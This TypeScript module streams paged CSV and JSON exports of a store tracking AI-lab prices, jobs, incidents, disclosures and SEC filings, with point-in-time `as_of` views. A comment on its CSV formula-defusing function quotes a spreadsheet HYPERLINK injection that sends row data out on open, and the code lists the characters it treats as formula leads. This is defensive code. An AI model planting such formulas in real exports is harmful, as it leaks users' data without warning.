// Bulk exports of the store: every table, as CSV or JSON, streamed in pages
// so a 100k-row changes table never has to fit in Worker memory at once.
//
// The entity views (prices_latest, jobs_open, incidents, revenue_facts) flatten the JSON payload
// into columns, because a CSV with a JSON blob in one cell is not a
// spreadsheet anyone can sort. Provenance columns are always present and
// always last: source_url and fetched_at on every table except source_runs,
// which has no fetched_at by design (a failed run fetched nothing) and
// carries started_at instead.
//
// The CSV defuses cells a spreadsheet would execute (see defuseFormula); the
// JSON is verbatim, because nothing executes a JSON string.
//
// `?as_of=` (ExportTable.at) serves a table as the store held it at that instant:
// an append-only table by the column that says when each row was written,
// read as a range on the index its keyset already pages; an entity view
// rebuilt from the change log (terminal-asof.ts); and a table rewritten in
// place with no log refused with a 400, since its past is gone.
//
// Pure functions of the Drizzle client, so layers/terminal/test/terminal-export.test.ts can
// drive them against the workerd D1 and read the bytes back.

import { and, asc, count, eq, lte, sql, type SQL } from 'drizzle-orm'
import type { SQLiteColumn, SQLiteTable } from 'drizzle-orm/sqlite-core'

import * as tables from '#server/db/schema'
import { riskFactorChanges } from '../pipeline/parsers/sec/prospectus-risk-factors'
import type { PipelineDb } from '../pipeline/store'
import {
  AS_OF_PARAM,
  PointInTimeError,
  alertsKnownAt,
  judgeCutoffAt,
  rewindEntities,
} from './terminal-asof'
import { ENTITY_SECURITIES, ENTITY_SECURITY_COLUMNS } from './terminal-entities'
import { byString } from './terminal-json'

export const EXPORT_PAGE_SIZE = 200

type Row = Record<string, unknown>

export interface ExportTable {
  name: string
  description: string
  columns: readonly string[]
  /**
   * One page of rows in a stable order, already reduced to `columns`: the
   * first page for `after` null, else the rows that follow `after` (the last
   * row of the previous page). Keyset, not OFFSET — an offset page re-reads
   * every row before it, so streaming a table was quadratic in its size.
   */
  page(db: PipelineDb, after: Row | null, limit: number, where?: SQL): Promise<Row[]>
  count(db: PipelineDb): Promise<number>
  /** Query parameters this table can be narrowed by (`?recipe_id=`), each an equality on a column. */
  filters?: Readonly<Record<string, SQLiteColumn>>
  /** The table as the store held it at `at`; throws PointInTimeError when its past is not kept. */
  at(db: PipelineDb, at: string): Promise<ExportTable>
  /** Why `at` refuses, or null when it answers. */
  asOfRefusal: string | null
}

/**
 * The equality filters a request asks for, as one SQL condition. A parameter
 * the table does not declare is an error, never silently ignored: an export
 * that ignores `?recipe_id=` hands back the whole table under a name that
 * says otherwise.
 */
export function exportFilter(
  table: ExportTable,
  query: Record<string, unknown>,
): { where: SQL | undefined } | { error: string } {
  const conditions: SQL[] = []
  for (const [name, raw] of Object.entries(query)) {
    if (name === AS_OF_PARAM) continue // ExportTable.at, not a column filter
    const column = table.filters?.[name]
    if (!column) {
      const allowed = Object.keys(table.filters ?? {})
      return {
        error: `${table.name} cannot be filtered by ${name}${allowed.length ? `; it accepts ${allowed.join(', ')}` : ''}`,
      }
    }
    if (typeof raw !== 'string' || !/^[\w.@-]{1,100}$/.test(raw)) {
      return { error: `${name} must be one id of letters, digits, '.', '@' or '-'` }
    }
    conditions.push(eq(column, raw))
  }
  return { where: conditions.length ? and(...conditions) : undefined }
}

/** How an append-only table answers `as_of`: the rows written by `at`. */
type WrittenBy = (db: PipelineDb, at: string) => Promise<SQL | undefined>

/** A unique sort key: the columns a keyset page orders by and resumes after. */
type Key = readonly [SQLiteColumn, ...SQLiteColumn[]]

/** Rows strictly after `after` in the order of `key`, as one row-value compare
 * so SQLite can seek the composite index instead of filtering. */
function afterKey(key: Key, after: Row | null): SQL | undefined {
  if (after === null) return undefined
  const columns = sql.join([...key], sql`, `)
  const values = sql.join(
    key.map((c) => sql`${after[c.name]}`),
    sql`, `,
  )
  return sql`(${columns}) > (${values})`
}

const PROVENANCE = ['source_url', 'fetched_at'] as const

const PRICE_FIELDS = [
  'model_slug',
  'tier',
  'context_window',
  'input_per_mtok',
  'cached_input_per_mtok',
  'output_per_mtok',
  'currency',
  'effective_from',
  'effective_until',
  'notes',
] as const

const REVENUE_FIELDS = [
  'cik',
  'entity_name',
  'taxonomy',
  'tag',
  'unit',
  'start',
  'end',
  'val',
  'accession_no',
  'fy',
  'fp',
  'form',
  'filed',
  'frame',
  'whitelist_cik',
] as const

const JOB_FIELDS = [
  'job_id',
  'title',
  'department',
  'team',
  'location',
  'employment_type',
  'published_at',
  'updated_at',
  'company_name',
] as const

const INCIDENT_FIELDS = [
  'incident_id',
  'title',
  'impact',
  'status',
  'started_at',
  'resolved_at',
  'components',
  'incident_url',
] as const

const DISCLOSURE_FIELDS = [
  'kind',
  'entry_id',
  'title',
  'summary',
  'model',
  'observed_during',
  'listed_on',
  'entry_url',
] as const

const DISCLOSURE_TIMELINE_FIELDS = [
  'entry_id',
  'title',
  'lines',
  'discovered_on',
  'disclosed_on',
] as const

function parsePayload(text: string): Row {
  try {
    const value = JSON.parse(text) as unknown
    return typeof value === 'object' && value !== null && !Array.isArray(value)
      ? (value as Row)
      : {}
  } catch {
    return {}
  }
}

/** Keep only `columns`, in order, with null for anything the row lacks. */
function project(row: Row, columns: readonly string[]): Row {
  const out: Row = {}
  for (const column of columns) out[column] = row[column] ?? null
  return out
}

function entityView(
  name: string,
  description: string,
  entityType:
    | 'model'
    | 'job'
    | 'incident'
    | 'ranking'
    | 'revenue'
    | 'filer'
    | 'disclosure'
    | 'disclosure_timeline',
  fields: readonly string[],
): ExportTable {
  const columns = [
    'entity_key',
    'source_id',
    'provider',
    ...fields,
    'content_hash',
    'snapshot_id',
    'first_seen_at',
    ...PROVENANCE,
  ]
  const ofType = eq(tables.entities.entity_type, entityType)
  const key = [tables.entities.source_id, tables.entities.entity_key] as const
  return {
    name,
    description,
    columns,
    async at(db, at) {
      // The current set is the view; as of T it is rebuilt in memory (one
      // type's rows and change log) and paged by the same keyset.
      const rewound = await rewindEntities(db, entityType, at)
      const unverified = new Set(rewound.unverified)
      const columnsAt = [...columns.slice(0, -2), 'as_of_verified', ...PROVENANCE]
      const rows = rewound.rows.map(({ payload, ...rest }) =>
        project(
          {
            ...parsePayload(payload),
            ...rest,
            as_of_verified: !unverified.has(rest.entity_key),
          },
          columnsAt,
        ),
      )
      const keyOf = (r: Row) => [String(r.source_id), String(r.entity_key)] as const
      return {
        name,
        description,
        columns: columnsAt,
        async page(_db, after, limit) {
          if (after === null) return rows.slice(0, limit)
          const [s, k] = keyOf(after)
          const from = rows.findIndex((r) => {
            const [rs, rk] = keyOf(r)
            return byString(rs, s) > 0 || (rs === s && byString(rk, k) > 0)
          })
          return from === -1 ? [] : rows.slice(from, from + limit)
        },
        count: async () => rows.length,
        at: () => Promise.reject(new PointInTimeError('already a point-in-time view')),
        asOfRefusal: null,
      }
    },
    asOfRefusal: null,
    async page(db, after, limit) {
      const rows = await db
        .select()
        .from(tables.entities)
        .where(and(ofType, afterKey(key, after)))
        .orderBy(...key.map((c) => asc(c)))
        .limit(limit)
      return rows.map(({ payload, ...rest }) =>
        project({ ...parsePayload(payload), ...rest }, columns),
      )
    },
    async count(db) {
      const [row] = await db.select({ total: count() }).from(tables.entities).where(ofType)
      return row?.total ?? 0
    },
  }
}

/**
 * An entity view with one output row per part of a payload — a statement's
 * lines, a schedule's buckets, a filing's headings. The keyset is the entity's
 * (source_id, entity_key) plus the part's ordinal, so a page can end inside an
 * entity. `prepare` reads anything the parts are computed against (an earlier
 * filing's headings) once per page.
 */
function partsView<C>(
  name: string,
  description: string,
  entityType: 'statement' | 'commitment' | 'concentration' | 'shares' | 'risk_factors',
  fields: readonly string[],
  explode: (payload: Row, context: C) => Row[],
  prepare: (db: PipelineDb) => Promise<C>,
): ExportTable {
  const columns = [
    'entity_key',
    'source_id',
    'provider',
    'part',
    ...fields,
    'first_seen_at',
    ...PROVENANCE,
  ]
  const ofType = eq(tables.entities.entity_type, entityType)
  const { source_id, entity_key } = tables.entities
  const at = (after: Row, strict: boolean) =>
    strict
      ? sql`(${source_id}, ${entity_key}) > (${after.source_id}, ${after.entity_key})`
      : sql`(${source_id}, ${entity_key}) >= (${after.source_id}, ${after.entity_key})`
  return {
    name,
    description,
    columns,
    async page(db, after, limit) {
      const context = await prepare(db)
      const out: Row[] = []
      let cursor: { row: Row; strict: boolean } | null = after
        ? { row: after, strict: false }
        : null
      for (;;) {
        const rows = await db
          .select()
          .from(tables.entities)
          .where(and(ofType, cursor ? at(cursor.row, cursor.strict) : undefined))
          .orderBy(asc(source_id), asc(entity_key))
          .limit(limit)
        for (const { payload, ...rest } of rows) {
          const resumes =
            after !== null &&
            rest.source_id === after.source_id &&
            rest.entity_key === after.entity_key
          explode(parsePayload(payload), context).forEach((part, i) => {
            if (resumes && i <= Number(after.part)) return
            out.push(project({ ...part, ...rest, part: i }, columns))
          })
          if (out.length >= limit) return out.slice(0, limit)
        }
        if (rows.length < limit) return out
        cursor = { row: rows.at(-1)!, strict: true }
      }
    },
    async count(db) {
      const context = await prepare(db)
      const rows = await db
        .select({ payload: tables.entities.payload })
        .from(tables.entities)
        .where(ofType)
      return rows.reduce((n, r) => n + explode(parsePayload(r.payload), context).length, 0)
    },
    // #142 (as_of) and #144 (these views) merged in parallel; rewinding an
    // exploded view through the change log is not built, so it says so.
    at: () => Promise.reject(new PointInTimeError(PARTS_AS_OF_REFUSAL)),
    asOfRefusal: PARTS_AS_OF_REFUSAL,
  }
}

const PARTS_AS_OF_REFUSAL =
  'a registration-statement view is exploded from the current filing rows, and rewinding it is not built yet.'

const FILING_FIELDS = ['cik', 'entity_name', 'accession_no', 'form', 'filed'] as const
const filing = (p: Row): Row => Object.fromEntries(FILING_FIELDS.map((f) => [f, p[f] ?? null]))
const list = (v: unknown): Row[] => (Array.isArray(v) ? (v as Row[]) : [])
const none = async () => null

/** Per filing, the previous filing's risk-factor headings by the same filer. */
async function priorHeadings(db: PipelineDb): Promise<Map<string, Row>> {
  const rows = await db
    .select({ payload: tables.entities.payload })
    .from(tables.entities)
    .where(eq(tables.entities.entity_type, 'risk_factors'))
  const filings = rows
    .map((r) => parsePayload(r.payload))
    .sort((a, b) =>
      `${a.cik}${a.filed}${a.accession_no}` < `${b.cik}${b.filed}${b.accession_no}` ? -1 : 1,
    )
  const prior = new Map<string, Row>()
  filings.forEach((f, i) => {
    const before = filings[i - 1]
    if (before && before.cik === f.cik) prior.set(String(f.accession_no), before)
  })
  return prior
}

type Sections = { title: string; headings: string[] }[]

function plainTable(
  name: string,
  description: string,
  table: SQLiteTable,
  columns: readonly string[],
  key: Key,
  writtenBy: WrittenBy | string,
  total?: SQL<number>,
  filters?: Readonly<Record<string, SQLiteColumn>>,
  /** Rows this export never serves, whatever the request asks for. */
  scope?: SQL,
): ExportTable {
  const pageWhere =
    (filter: SQL | undefined) =>
    async (db: PipelineDb, after: Row | null, limit: number, where?: SQL) => {
      const rows = await db
        .select()
        .from(table)
        .where(and(filter, afterKey(key, after), where, scope))
        .orderBy(...key.map((c) => asc(c)))
        .limit(limit)
      return rows.map((row) => project(row as Row, columns))
    }
  return {
    name,
    description,
    columns,
    filters,
    page: pageWhere(undefined),
    async at(db, at) {
      if (typeof writtenBy === 'string') throw new PointInTimeError(writtenBy)
      const filter = await writtenBy(db, at)
      return {
        name,
        description,
        columns,
        filters,
        page: pageWhere(filter),
        // A count up to T would read every row up to T; nothing asks for it.
        count: () => Promise.reject(new Error('not counted as of T')),
        at: () => Promise.reject(new PointInTimeError('already a point-in-time view')),
        asOfRefusal: null,
      }
    },
    asOfRefusal: typeof writtenBy === 'string' ? writtenBy : null,
    async count(db) {
      if (total) {
        const [row] = await db.select({ total }).from(tables.sourceStats)
        return Number(row?.total ?? 0)
      }
      const [row] = await db.select({ total: count() }).from(table).where(scope)
      return row?.total ?? 0
    },
  }
}

/** A table that lives in code, not D1: a few hand-checked rows, each with its own source. */
function staticTable(
  name: string,
  description: string,
  columns: readonly string[],
  rows: readonly object[],
  asOfRefusal: string,
): ExportTable {
  return {
    name,
    description,
    columns,
    async page(_db, after) {
      return after === null ? rows.map((row) => project(row as Row, columns)) : []
    },
    async count() {
      return rows.length
    },
    at: () => Promise.reject(new PointInTimeError(asOfRefusal)),
    asOfRefusal,
  }
}

/**
 * Tables that were exported and no longer are, with the reason a request for
 * one is told (410, not 404: the URL existed). See docs/source-audit.md.
 */
export const WITHDRAWN_EXPORTS: Readonly<Record<string, string>> = {
  rankings_daily:
    'OpenRouter licenses its rankings CC BY 4.0 but says the dataset "is not intended to be re-served as a competing free API", so the raw per-model daily rows are no longer bulk-exported. Per-lab shares and top models stay at /rankings and /api/rankings; the rows themselves are at openrouter.ai/api/v1/datasets/rankings-daily with an OpenRouter key.',
}

// OpenRouter's per-model daily rows reach the change log as `ranking` changes
// with the row in before_json/after_json; the changes export leaves them out
// for the same reason rankings_daily is withdrawn.
const notRanking = sql`${tables.changes.entity_type} <> 'ranking'`

// The two tables that gain a row per source per tick are counted from
// source_stats; a count(*) over either reads every row ever written.
const loggedTotal = (column: SQLiteColumn) => sql<number>`coalesce(sum(${column}), 0)`

/** Rows whose own timestamp (the leading keyset column, so an index range) is at or before T. */
const byColumn =
  (column: SQLiteColumn): WrittenBy =>
  async (_db, at) =>
    lte(column, at)

export const EXPORT_TABLES: Readonly<Record<string, ExportTable>> = {
  snapshots: plainTable(
    'snapshots',
    'One row per fetch of every source: content hash, HTTP status, byte count, and the R2 key of the raw payload.',
    tables.snapshots,
    ['id', 'source_id', 'content_hash', 'raw_key', 'http_status', 'bytes', ...PROVENANCE],
    [tables.snapshots.fetched_at, tables.snapshots.id],
    byColumn(tables.snapshots.fetched_at),
    loggedTotal(tables.sourceStats.snapshot_count),
  ),
  prices_latest: entityView(
    'prices_latest',
    'The current price and catalog row per SKU and source, as each vendor page states it at the latest poll.',
    'model',
    PRICE_FIELDS,
  ),
  jobs_open: entityView(
    'jobs_open',
    'Every role currently listed on the tracked boards. A closed role leaves this table and is recorded in changes.',
    'job',
    JOB_FIELDS,
  ),
  incidents: entityView(
    'incidents',
    'Every stored status-page incident: title, vendor impact and status verbatim, start and resolution, and components. Append-only: an incident that drops out of its feed is kept.',
    'incident',
    INCIDENT_FIELDS,
  ),
  disclosures: entityView(
    'disclosures',
    'Every entry on a lab’s own misalignment-disclosure index (only OpenAI publishes one): report or notice, title, summary, model, and context verbatim, and the date the index prints beside it. A count measures disclosure, not behavior.',
    'disclosure',
    DISCLOSURE_FIELDS,
  ),
  disclosure_timelines: entityView(
    'disclosure_timelines',
    'The dates printed on each report’s own page: every “Label: value” line verbatim, the discovery date, and a printed disclosure date where the page has one.',
    'disclosure_timeline',
    DISCLOSURE_TIMELINE_FIELDS,
  ),
  filers: entityView(
    'filers',
    'One row per lab whose CIK was resolved at poll time from its own registration filing (sources.yaml pending_filers): the CIK, EDGAR’s name for the filer, and the filing it was read from.',
    'filer',
    ['provider', 'cik', 'name', 'resolved_form', 'resolved_accession', 'resolved_file_date'],
  ),
  revenue_facts: entityView(
    'revenue_facts',
    'One row per XBRL revenue fact from EDGAR company facts: filer, tag, period, value in USD, and the filing that reported it. Append-only: a restatement is a new row under its own accession.',
    'revenue',
    REVENUE_FIELDS,
  ),
  prospectus_statements: partsView(
    'prospectus_statements',
    'Every line of the statement of operations printed in a lab’s own registration filing (S-1, S-1/A), one row per filing, period and line: the line verbatim, a canonical key where known, and the value in USD, shares or USD per share. Null is a dash. Interim periods are unaudited.',
    'statement',
    [...FILING_FIELDS, 'start', 'end', 'unaudited', 'units', 'line_key', 'label', 'val', 'unit'],
    (p) =>
      list(p.lines).map((l) => ({
        ...filing(p),
        start: p.start,
        end: p.end,
        unaudited: p.unaudited === true,
        units: p.units,
        line_key: l.key,
        label: l.label,
        val: l.val,
        unit: l.unit,
      })),
    none,
  ),
  prospectus_commitments: partsView(
    'prospectus_commitments',
    'Contractual commitments a lab’s registration filing prints: MD&A’s contractual-obligations table, the commitments note’s purchase-commitment schedule, and the one-figure totals, as of each date stated. One row per schedule line and year bucket, bucket “Total” for the line’s total. approximate marks a figure the filing calls approximate; statement quotes its sentence.',
    'commitment',
    [
      ...FILING_FIELDS,
      'schedule',
      'as_of',
      'audited',
      'approximate',
      'line',
      'bucket',
      'val',
      'statement',
    ],
    (p) =>
      list(p.lines).flatMap((l) =>
        [{ label: 'Total', val: l.total }, ...list(l.buckets)].map((b) => ({
          ...filing(p),
          schedule: p.schedule,
          as_of: p.as_of,
          audited: p.audited,
          approximate: p.approximate,
          line: l.label,
          bucket: b.label,
          val: b.val,
          statement: p.statement,
        })),
      ),
    none,
  ),
  prospectus_concentration: partsView(
    'prospectus_concentration',
    'Customers at or above 10% of revenue or of accounts receivable, from a lab’s registration filing: one row per filing, basis, customer and period or balance date, named as the filing names them. A null pct is the filing’s “*”: under 10%, not zero.',
    'concentration',
    [...FILING_FIELDS, 'basis', 'customer', 'start', 'end', 'unaudited', 'pct'],
    (p) => {
      const columns = list(p.columns)
      return list(p.customers).flatMap((c) =>
        columns.map((col, i) => ({
          ...filing(p),
          basis: p.basis,
          customer: c.label,
          start: col.start,
          end: col.end,
          unaudited: col.unaudited,
          pct: (c.pct as unknown[])[i] ?? null,
        })),
      )
    },
    none,
  ),
  prospectus_shares: partsView(
    'prospectus_shares',
    'Share counts from a lab’s registration filing: each row of “The Offering” (shares offered, and each class outstanding after the offering, with the underwriters’ option where stated) and the pre-offering counts it is based on. Null while the filing leaves a count blank.',
    'shares',
    [...FILING_FIELDS, 'measure', 'as_of', 'label', 'shares', 'with_option'],
    (p) => [
      ...list(p.lines).map((l) => ({
        ...filing(p),
        measure: 'the_offering',
        as_of: null,
        label: l.label,
        shares: l.shares,
        with_option: l.with_option,
      })),
      ...list(p.before).map((l) => ({
        ...filing(p),
        measure: 'before_offering',
        as_of: p.before_as_of,
        label: l.label,
        shares: l.shares,
        with_option: null,
      })),
    ],
    none,
  ),
  prospectus_risk_factors: partsView(
    'prospectus_risk_factors',
    'Every risk-factor heading in a lab’s registration filing, verbatim and in order, with what it is against the same filer’s previous filing: unchanged, added, reworded (previous holds the earlier words), or removed (a heading the previous filing printed and this one does not, listed after this filing’s own).',
    'risk_factors',
    [...FILING_FIELDS, 'section', 'heading', 'change', 'previous'],
    (p, prior) => {
      const sections = list(p.sections) as unknown as Sections
      const before = prior.get(String(p.accession_no))
      const changes = before
        ? riskFactorChanges(
            { sections: list(before.sections) as unknown as Sections },
            { sections },
          )
        : []
      const of = (heading: string) =>
        changes.find((c) => c.kind !== 'removed' && c.heading === heading)
      return [
        ...sections.flatMap((s) =>
          s.headings.map((heading) => ({
            ...filing(p),
            section: s.title,
            heading,
            change: before ? (of(heading)?.kind ?? 'unchanged') : null,
            previous: of(heading)?.previous ?? null,
          })),
        ),
        ...changes
          .filter((c) => c.kind === 'removed')
          .map((c) => ({
            ...filing(p),
            section: c.section,
            heading: c.heading,
            change: 'removed',
            previous: null,
          })),
      ]
    },
    priorHeadings,
  ),
  changes: plainTable(
    'changes',
    'Append-only change log: each entity added, removed, or modified, with the before and after payloads. OpenRouter ranking rows are left out (see rankings_daily on /data).',
    tables.changes,
    [
      'id',
      'entity_key',
      'entity_type',
      'provider',
      'change_type',
      'before_hash',
      'after_hash',
      'before_json',
      'after_json',
      'detected_at',
      ...PROVENANCE,
    ],
    [tables.changes.detected_at, tables.changes.id],
    byColumn(tables.changes.detected_at),
    undefined,
    undefined,
    notRanking,
  ),
  alerts: plainTable(
    'alerts',
    'Every alert fired, with the change ids it cites and the rule that produced it.',
    tables.alerts,
    [
      'id',
      'severity',
      'headline',
      'explanation',
      'change_ids',
      'rule',
      'created_at',
      ...PROVENANCE,
    ],
    [tables.alerts.created_at, tables.alerts.id],
    async (db, at) => alertsKnownAt(at, await judgeCutoffAt(db, at)),
  ),
  claim_readings: plainTable(
    'claim_readings',
    'One row per thesis claim and data date: the measured value its kill condition is checked against, with the detail behind it (docs/theses/).',
    tables.claimReadings,
    ['thesis_id', 'claim_id', 'date', 'value', 'detail', 'computed_at', ...PROVENANCE],
    [tables.claimReadings.claim_id, tables.claimReadings.date],
    'a claim reading is rewritten in place while its data is revised, and the value it replaced is not kept.',
  ),
  claim_verdicts: plainTable(
    'claim_verdicts',
    'Append-only: the judge’s verdict on each candidate event for a judged thesis claim, with its grounded rationale and the facts the Worker computed (a cut’s size, an outage’s hours).',
    tables.claimVerdicts,
    [
      'id',
      'thesis_id',
      'claim_id',
      'subject',
      'change_id',
      'provider',
      'verdict',
      'rationale',
      'facts',
      'detected_at',
      'judged_at',
      ...PROVENANCE,
    ],
    [tables.claimVerdicts.detected_at, tables.claimVerdicts.id],
    // Judged after the change it rates; held back until it was judged.
    async (_db, at) =>
      and(lte(tables.claimVerdicts.detected_at, at), lte(tables.claimVerdicts.judged_at, at)),
  ),
  recipe_observations: plainTable(
    'recipe_observations',
    'What each thesis recipe read from its public source (layers/terminal/server/theses/recipes/): one row per recipe, key and date, with the value, the fields kept beside it, and the R2 key of the raw bytes.',
    tables.recipeObservations,
    [
      'id',
      'recipe_id',
      'company',
      'key',
      'date',
      'value',
      'payload',
      'raw_key',
      'first_seen_at',
      ...PROVENANCE,
    ],
    // id last: (recipe_id, key, date) is not unique, and a keyset needs a key that is.
    [
      tables.recipeObservations.recipe_id,
      tables.recipeObservations.key,
      tables.recipeObservations.date,
      tables.recipeObservations.id,
    ],
    'a recipe observation is rewritten in place when a re-read gives a different value, and the value it replaced is not kept.',
    undefined,
    { recipe_id: tables.recipeObservations.recipe_id },
  ),
  source_runs: plainTable(
    'source_runs',
    'One row per poll tick and source: what was attempted and the outcome. No fetched_at column; a failed run fetched nothing.',
    tables.sourceRuns,
    [
      'id',
      'scope',
      'source_id',
      'started_at',
      'status',
      'detail',
      'snapshot_id',
      'added',
      'removed',
      'modified',
      'source_url',
    ],
    [tables.sourceRuns.started_at, tables.sourceRuns.id],
    byColumn(tables.sourceRuns.started_at),
    loggedTotal(tables.sourceStats.run_count),
  ),
  entity_securities: staticTable(
    'entity_securities',
    'Each tracked lab and SEC filer mapped to the securities that carry it: the issuer, CIK, symbol and exchange as EDGAR lists them, how the entity relates to the security (itself, its parent, a disclosed investor), and the source of each row. A private lab with no security has a row saying so.',
    ENTITY_SECURITY_COLUMNS,
    ENTITY_SECURITIES,
    'a hand-checked table kept in code; each row is dated by its checked_on.',
  ),
}

export const EXPORT_TABLE_NAMES = Object.keys(EXPORT_TABLES)

/** Rows in a sample file: the first rows of the table in export order, oldest first where the key is a time. */
export const SAMPLE_ROWS = 50

/** The same table cut to its first SAMPLE_ROWS rows, for /export/sample/<table>.<format>. */
export function sampleOf(table: ExportTable): ExportTable {
  return {
    ...table,
    filters: undefined,
    async page(db, after, _limit, where) {
      return after === null ? table.page(db, null, SAMPLE_ROWS, where) : []
    },
    async count(db) {
      return Math.min(SAMPLE_ROWS, await table.count(db))
    },
    async at(db, at) {
      return sampleOf(await table.at(db, at))
    },
  }
}

export function exportTable(name: string): ExportTable | null {
  return Object.prototype.hasOwnProperty.call(EXPORT_TABLES, name) ? EXPORT_TABLES[name]! : null
}

export type ExportFormat = 'csv' | 'json'

/**
 * `<table>.<format>` off a request path. The route files are named
 * `[table].csv.get.ts` and `[table].json.get.ts`, but a router param cannot
 * own half a segment: Nitro registers both as catch-alls over `/export/x`
 * and whichever registered first answers every request. So neither the
 * table nor the format is trusted to the router — both are read here, and
 * either route file serves either format correctly.
 */
export function parseExportPath(path: string): { name: string; format: ExportFormat } | null {
  const file = path.split('?')[0]!.split('/').pop() ?? ''
  const match = file.match(/^([a-z_]+)\.(csv|json)$/)
  return match ? { name: match[1]!, format: match[2] as ExportFormat } : null
}

// ---- CSV -------------------------------------------------------------------

/**
 * Characters a spreadsheet reads as "this cell is a formula" when they lead.
 * Tab and carriage return are here because Excel skips leading whitespace
 * before deciding, so `\t=cmd` is a formula too.
 */
const FORMULA_LEAD = /^[=+@\t\r]/

/** A cell that is just a number. `-3.5e4` leads with `-` and is not a formula. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/

/**
 * Defuse a cell a spreadsheet would execute.
 *
 * These exports are meant to be opened in Excel or Sheets — that is what
 * `Content-Disposition: attachment` is for — and the strings in them are not
 * ours: job titles, incident titles, vendor price notes and judge-written
 * headlines all originate outside this Worker. A cell beginning `=`, `+`, `@`
 * or `-` is a formula there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates
 * the row on open, with no macro prompt and no warning.
 *
 * A leading apostrophe is the standard defusal: the spreadsheet treats the
 * rest as literal text. It is visible in the cell, which is a real cost for a
 * project that exports verbatim source data — so it is spent only where a
 * value would otherwise be executed, and never on a plain number, which is
 * the one case where a leading `-` is data rather than a fuse.
 */
export function defuseFormula(text: string): string {
  if (FORMULA_LEAD.test(text)) return `'${text}`
  if (text.startsWith('-') && !PLAIN_NUMBER.test(text)) return `'${text}`
  return text
}

/** RFC 4180: quote when the value carries a comma, a quote, or a line break.
 * A list (an incident's components) is one JSON cell, not a comma-joined string
 * that a spreadsheet would split. Formula leads are defused first — see
 * defuseFormula — so quoting never wraps a cell the reader would execute. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return ''
  const text = defuseFormula(
    typeof value === 'string'
      ? value
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value),
  )
  return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}

export function csvLine(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(',')}\r\n`
}

// ---- streaming -------------------------------------------------------------

async function* pages(db: PipelineDb, table: ExportTable, where?: SQL): AsyncGenerator<Row[]> {
  let after: Row | null = null
  for (;;) {
    const rows = await table.page(db, after, EXPORT_PAGE_SIZE, where)
    if (rows.length === 0) return
    yield rows
    if (rows.length < EXPORT_PAGE_SIZE) return
    after = rows.at(-1)!
  }
}

export async function* csvChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield csvLine(table.columns)
  for await (const rows of pages(db, table, where)) {
    yield rows.map((row) => csvLine(table.columns.map((c) => row[c]))).join('')
  }
}

export async function* jsonChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield '[\n'
  let first = true
  for await (const rows of pages(db, table, where)) {
    const body = rows.map((row) => JSON.stringify(row)).join(',\n')
    yield `${first ? '' : ',\n'}${body}`
    first = false
  }
  yield '\n]\n'
}

/** A byte stream over text chunks; the generator is closed if the reader goes away. */
export function streamOf(chunks: AsyncGenerator<string>): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder()
  return new ReadableStream<Uint8Array>({
    async pull(controller) {
      const { value, done } = await chunks.next()
      if (done) controller.close()
      else controller.enqueue(encoder.encode(value))
    },
    async cancel() {
      await chunks.return(undefined)
    },
  })
}

/** Everything the stream yielded, joined — for tests and small exports. */
export async function collect(chunks: AsyncGenerator<string>): Promise<string> {
  let out = ''
  for await (const chunk of chunks) out += chunk
  return out
}
